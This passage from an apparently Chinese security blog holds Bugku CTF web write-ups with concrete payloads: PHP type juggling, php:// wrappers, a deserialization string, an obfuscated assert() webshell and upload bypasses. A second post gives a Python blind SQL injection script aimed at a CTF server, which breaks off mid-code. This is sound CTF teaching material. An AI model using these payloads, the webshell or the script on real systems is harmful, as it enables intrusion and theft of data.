class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;可以看到flag文件已经暴露出来，直接访问也可以拿到flag。但这里介绍绕过检测拿到flag的方法。可以看到满足拿flag的条件有三个：<br><em> <strong>一：id</strong><br><br>&emsp;&emsp;&emsp;&emsp;id既要不等于0（<code>if(!$_GET[&#39;id&#39;])</code>），又要等于0（<code>$id==0</code>）。所以这里我们要利用php的松散性，<code>字符串跟0比较（==）是成立的</code>，所以payload：<code>&quot;aaa&quot; == 0</code>
+</em> <strong>二：php伪协议</strong><br><br>&emsp;&emsp;&emsp;&emsp;<code>$data = @file_get_contents($a,&#39;r&#39;);</code>的存在可以使用<code>php://input</code>在绕过，所以：<code>a=php://input</code>，然后在<code>post</code>bugku is a nice plateform!。<br><em> <strong>三：字符截断</strong>
+
+</em> &emsp;&emsp;&emsp;&emsp;假设：<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="hljs-string">"%0012345"</span></span><br><span class="line">substr($b,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)  --&gt; 将返回空（<span class="hljs-keyword">null</span>）</span><br><span class="line">strlen($b)&gt;<span class="hljs-number">5</span>  --&gt; 是成立的</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;所以最终的payload：<code>?id=aaa&amp;a=php://input&amp;b=%00abcde</code>。<br><div align="center"><br>    <img src="/images/posts/bugku/32.png"><br></div>
+
+<h3 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h3><p>&emsp;&emsp;查看网页源代码可以发现存在<code>源码泄露</code>漏洞。</p>
+<div align="center"><br>    <img src="/images/posts/bugku/33.png"><br></div><br>&emsp;&emsp;使用<code>php伪协议：php://input，php://filter</code>可以读取index.php和hint.php的base64源码。<br><div align="center"><br>    <img src="/images/posts/bugku/34.png"><br></div><br>&emsp;&emsp;这里直接贴解密后的代码。<br><strong>index.php</strong><br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span>  </span><br><span class="line">$txt = $_GET[<span class="hljs-string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="hljs-string">"file"</span>];  </span><br><span class="line">$password = $_GET[<span class="hljs-string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="hljs-string">'r'</span>)===<span class="hljs-string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"hello friend!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/flag/"</span>,$file))&#123; </span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"不能现在就给你flag哦"</span>;</span><br><span class="line">        <span class="hljs-keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="hljs-keyword">else</span>&#123;  </span><br><span class="line">        <span class="hljs-keyword">include</span>($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        <span class="hljs-keyword">echo</span> $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="hljs-keyword">else</span>&#123;  </span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"you are not the number of bugku ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><br><strong>hint.php</strong><br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<span class="hljs-comment">//flag.php  </span></span><br><span class="line">    <span class="hljs-keyword">public</span> $file;  </span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span><span class="hljs-params">()</span></span>&#123;  </span><br><span class="line">        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="hljs-keyword">return</span> (<span class="hljs-string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;从<code>$password = unserialize($password);</code>中很明显可以看到是<code>反序列化漏洞</code>，所以构造读取flag的payload：<code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>。<br><br>&emsp;&emsp;所以最终的payload为：<br><div align="center"><br>    <img src="/images/posts/bugku/35.png" height="70%"><br></div><br>&emsp;&emsp;这里要注意的是<code>file=hint.php</code>，因为要利用php对象反序列化要<code>先声明对象</code>，所以要将hint.php包含进来。<br><br>&emsp;&emsp;总的来说，这道题的考察点算是比较多的，包括：php伪协议、文件包含、php反序列化，所以质量还是可以的。<br><br>### 过狗一句话<br>&emsp;&emsp;题目描述：<br>&gt;<a href="http://120.24.86.145:8010/" target="_blank" rel="noopener">http://120.24.86.145:8010/</a><br>&gt;送给大家一个过狗一句话<br>&gt;&lt;?php $poc=”a#s#s#e#r#t”; $poc_1=explode(“#”,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[‘s’]) ?&gt;<br><br>&emsp;&emsp;这个一句话组合起来实际是：<code>assert($_GET[&#39;s&#39;])</code>，验证一下，发现确实可行。<br><div align="center"><br>    <img src="/images/posts/bugku/36.png"><br></div><br>&emsp;&emsp;但发现在执行<code>system</code>函数的时候无返回结果估计被禁用了。<br><div align="center"><br>    <img src="/images/posts/bugku/37.png"><br></div><br>&emsp;&emsp;接着使用php读取文件的代码：<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">eval</span>(<span class="hljs-string">"echo file_get_contents('flag.txt');"</span>)</span><br></pre></td></tr></table></figure><br><br><div align="center"><br>    <img src="/images/posts/bugku/38.png"><br></div><br>&emsp;&emsp;这里的<code>flag.txt</code>是我自己猜测的，但结果还真被我猜对了。。。<br><br>&emsp;&emsp;这道题解得有点侥幸，如果flag不存放在flag.txt，那么这方法将利用不了，所以为了解决这个问题，自己特别找了这道题的writeup，介绍一种使用php代码遍历当前目录的文件的方法：php中的<code>glob()</code>函数，详细说明如下：<br><div align="center"><br>    <img src="/images/posts/bugku/39.png"><br></div><br>&emsp;&emsp;所以我们可以使用<code>print_r(glob(&quot;*.*&quot;))</code>来打印当前目录下存在的文件。<br><div align="center"><br>    <img src="/images/posts/bugku/40.png"><br></div><br>&emsp;&emsp;然后再介绍几种读取文件的方法：<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show_source(<span class="hljs-string">'flag.txt'</span>);</span><br><span class="line">var_dump(file(<span class="hljs-string">"flag.txt"</span>));</span><br><span class="line">print_r(file(<span class="hljs-string">"flag.txt"</span>));</span><br></pre></td></tr></table></figure><br><br>### 字符？正则？<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="hljs-string">'2.php'</span>);</span><br><span class="line">$key=<span class="hljs-string">'KEY&#123;********************************&#125;'</span>;</span><br><span class="line">$IM= preg_match(<span class="hljs-string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="hljs-string">"id"</span>]), $match);</span><br><span class="line"><span class="hljs-keyword">if</span>( $IM )&#123; </span><br><span class="line">  <span class="hljs-keyword">die</span>(<span class="hljs-string">'key is: '</span>.$key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;这个还是比较简单的，其中一个payload：<code>?id=keyaaakeybbbbbkey:/c/dddkeye.</code>。<br><div align="center"><br>    <img src="/images/posts/bugku/41.png"><br></div>
+
+<h3 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h3><p>&emsp;&emsp;题目代码：<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="hljs-string">'flag.php'</span>); </span><br><span class="line">$_GET[<span class="hljs-string">'id'</span>] = urldecode($_GET[<span class="hljs-string">'id'</span>]); </span><br><span class="line">$flag = <span class="hljs-string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>; </span><br><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'uname'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'passwd'</span>])) &#123; </span><br><span class="line">    <span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'uname'</span>] == $_POST[<span class="hljs-string">'passwd'</span>]) </span><br><span class="line">        <span class="hljs-keyword">print</span> <span class="hljs-string">'passwd can not be uname.'</span>; </span><br><span class="line">    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_GET[<span class="hljs-string">'uname'</span>]) === sha1($_POST[<span class="hljs-string">'passwd'</span>])&amp;($_GET[<span class="hljs-string">'id'</span>]==<span class="hljs-string">'margin'</span>)) </span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag); </span><br><span class="line">    <span class="hljs-keyword">else</span> </span><br><span class="line">        <span class="hljs-keyword">print</span> <span class="hljs-string">'sorry!'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;<code>sha1</code>的绕过跟<code>md5</code>一样使用数组即可，注意请求的方式。</p>
+<div align="center"><br>    <img src="/images/posts/bugku/42.png"><br></div>
+
+<h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>&emsp;&emsp;题目源码：<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line"><span class="hljs-keyword">if</span> ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;This is flag:"</span> .<span class="hljs-string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;解题的关键在于<code>extract($_GET)</code>函数，它会将数组中的值按键值赋值，例如：<code>?id=1&amp;name=junay&amp;key=key</code>，经过<code>extract</code>的处理后会产生：<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="hljs-number">1</span>;</span><br><span class="line">$name = <span class="hljs-string">"junay"</span>;</span><br><span class="line">$key = <span class="hljs-string">"key"</span>;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;所以我们构造<code>$ac</code>跟<code>$fn</code>，其中<code>$fn</code>使用<code>php://input</code>伪协议。最终的payload：</p>
+<div align="center"><br>    <img src="/images/posts/bugku/43.png"><br></div>
+
+<h3 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h3><p>&emsp;&emsp;打开页面发现是<code>404</code>，但是对这个站熟悉的话，正常返回的404是不一样的，所以这个404是骗人的，而且通过网络可以验证这一点。</p>
+<div align="center"><br>    <img src="/images/posts/bugku/44.png"><br></div><br>&emsp;&emsp;同时，这里看到<code>No such file or directory.</code>，还给你加红显示，估计就是想让你<code>爆目录</code>，拿出扫描工具，结果如下。<br><div align="center"><br>    <img src="/images/posts/bugku/45.png"><br></div><br>&emsp;&emsp;访问<code>robots.txt</code>，可以发现线索。<br><div align="center"><br>    <img src="/images/posts/bugku/46.png"><br></div><br>&emsp;&emsp;再跟下去可以发现真正的页面<br><div align="center"><br>    <img src="/images/posts/bugku/47.png" height="70%"><br></div><br>&emsp;&emsp;因为题目说想办法变成admin，所以尝试构造<code>x=admin</code>试试，结果flag就出来了。<br><div align="center"><br>    <img src="/images/posts/bugku/48.png"><br></div>
+
+
+<h3 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h3><p>&emsp;&emsp;题目：</p>
+<p><div align="center"><br>    <img src="/images/posts/bugku/49.png"><br></div><br>&emsp;&emsp;这道题是看writeup做出来的，一开始测试时没有想到改<code>Content-Type</code>，其实只需要将其中的一个字母<code>大写</code>就可以了，然后测试<code>php2, php3, php4, php5，phps, pht, phtm, phtml</code>，发现只有<code>php5</code>能绕过。所以payload就是：</p>
+<p><div align="center"><br>    <img src="/images/posts/bugku/50.png"><br></div><br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;</p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-03-04T16:40:00.000Z">2018-03-05</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    8 分钟 读完 (大约 1236 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/03/sql-blind-injection-python/">python sql盲注脚本</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;sql注入中要数盲注比较慢，尤其是没有脚本辅助的情况下，所以写个<code>sql盲注</code>的<code>脚本</code>在ctf中有比较重要的作用。此文的程序语言为<code>python</code>。下面的脚本是对pragyan ctf web4的解决方案，所以payload中使用了base64编码，这里遇到一个小坑，比赛的时候使用<code>base64.b64encode()</code>发生了<code>编码错误</code>，又因为时间紧张，所以就放缓了脚本的编写，但现在已经解决了加密的编码问题。</p>
+<p>&emsp;&emsp;python3 base64编码问题的解决方法为：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># 先将string型的test3转换成bytes加密</span></span><br><span class="line">testi = base64.b64encode(test3.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line"><span class="hljs-comment"># 再将bytes型的testi转换成string</span></span><br><span class="line">testi = str(testi, encoding=<span class="hljs-string">'utf-8'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;脚本中为了提高爆破效率使用了<code>二分查找</code>的方法，并且使用返回页面的<code>大小</code>作为正确与否的判断，详细代码如下：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 适用于poc: 1' or 1=1 -- +</span></span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">'http://128.199.224.175:24000/'</span></span><br><span class="line"></span><br><span class="line">poc1 = <span class="hljs-string">"1' or 1=1 -- +"</span></span><br><span class="line">sqli = base64.b64encode(poc1.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">html = requests.post(url, params)</span><br><span class="line">r = html.text</span><br><span class="line">right_len = len(r)</span><br><span class="line"></span><br><span class="line">poc2 = <span class="hljs-string">"1' or 1=2 -- +"</span></span><br><span class="line">sqli = base64.b64encode(poc2.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">html = requests.post(url, params)</span><br><span class="line">r = html.text</span><br><span class="line">wrong_len = len(r)</span><br><span class="line">judge = wrong_len + (right_len - wrong_len) // <span class="hljs-number">2</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuzz</span><span class="hljs-params">(sql, test, pos1, pos2, tmp)</span>:</span></span><br><span class="line">    left = <span class="hljs-number">32</span></span><br><span class="line">    right = <span class="hljs-number">127</span></span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">        mid = (left + right) // <span class="hljs-number">2</span></span><br><span class="line">        <span class="hljs-comment"># print('正在测试字符：', str(mid))</span></span><br><span class="line">        test3 = test.format(pos1 - <span class="hljs-number">1</span>, pos2, mid)</span><br><span class="line">        testi = base64.b64encode(test3.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">        testi = str(testi, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">        params = &#123;<span class="hljs-string">'spy_name'</span>: testi&#125;</span><br><span class="line">        html = requests.post(url, params)</span><br><span class="line">        r = html.text</span><br><span class="line">        <span class="hljs-keyword">if</span> len(r) &gt; judge:</span><br><span class="line">            tmp += chr(mid)</span><br><span class="line">            <span class="hljs-keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">        sqli = sql.format(pos1 - <span class="hljs-number">1</span>, pos2, mid)</span><br><span class="line">        sqli = base64.b64encode(sqli.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">        sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">        params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">        html = requests.post(url, params)</span><br><span class="line">        r = html.text</span><br><span class="line">        <span class="hljs-keyword">if</span> len(r) &gt; judge:</span><br><span class="line">            left = mid</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line"></span><br><span class="line">database = <span class="hljs-string">''</span></span><br><span class="line">sql = <span class="hljs-string">"1' or (ascii(substr(database(),&#123;0&#125;,1)))&gt;&#123;1&#125; -- +"</span></span><br><span class="line">test = <span class="hljs-string">"1' or (ascii(substr(database(),&#123;0&#125;,1)))=&#123;1&#125; -- +"</span></span><br><span class="line"><span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):</span><br><span class="line">    <span class="hljs-comment"># 测试length(database())，一旦超过长度则不用再执行。</span></span><br><span class="line"></span><br><span class="line">    test2 = sql.format(pos,<span class="hljs-number">1</span>)</span><br><span class="line">    sqli = base64.b64encode(test2.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">    sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">    params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">    html = requests.post(url, params)</span><br><span class="line">    r = html.text</span><br><span class="line">    <span class="hljs-keyword">if</span> len(r) &lt; judge:</span><br><span class="line">        print(<span class="hljs-string">'======================'</span>)</span><br><span class="line">        print(<span class="hljs-string">'[*]database: '</span>,database)</span><br><span class="line">        print(<span class="hljs-string">'======================\n'</span>)</span><br><span class="line">        <span class="hljs-keyword">break</span></span><br><span class="line"></span><br><span class="line">    left = <span class="hljs-number">32</span></span><br><span class="line">    right = <span class="hljs-number">127</span></span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">        mid = (left + right) // <span class="hljs-number">2</span></span><br><span class="line">        <span class="hljs-comment"># print('正在测试字符：', str(mid))</span></span><br><span class="line">        test3 = test.format(pos, mid)</span><br><span class="line">        testi = base64.b64encode(test3.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">        testi = str(testi, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">        params = &#123;<span class="hljs-string">'spy_name'</span>: testi&#125;</span><br><span class="line">        html = requests.post(url, params)</span><br><span class="line">        r = html.text</span><br><span class="line">        <span class="hljs-keyword">if</span> len(r) &gt; judge:</span><br><span class="line">            database += chr(mid)</span><br><span class="line">            print(<span class="hljs-string">'[+]database: '</span>, database)</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line"></span><br><span class="line">        sqli = sql.format(pos, mid)</span><br><span class="line">        sqli = base64.b64encode(sqli.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">        sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">        params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">        html = requests.post(url, params)</span><br><span class="line">        r = html.text</span><br><span class="line">        <span class="hljs-keyword">if</span> len(r) &gt; judge:</span><br><span class="line">            left = mid</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tables_name = &#123;&#125;</span><br><span class="line">sql = <span class="hljs-string">"1' or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1)))&gt;&#123;2&#125; -- +"</span></span><br><span class="line">test = <span class="hljs-string">"1' or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1)))=&#123;2&#125; -- +"</span></span><br><span class="line"><span class="hljs-keyword">for</span> table_num <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">20</span>):</span><br><span class="line">    sqli = sql.format(table_num - <span class="hljs-number">1</span>, <span 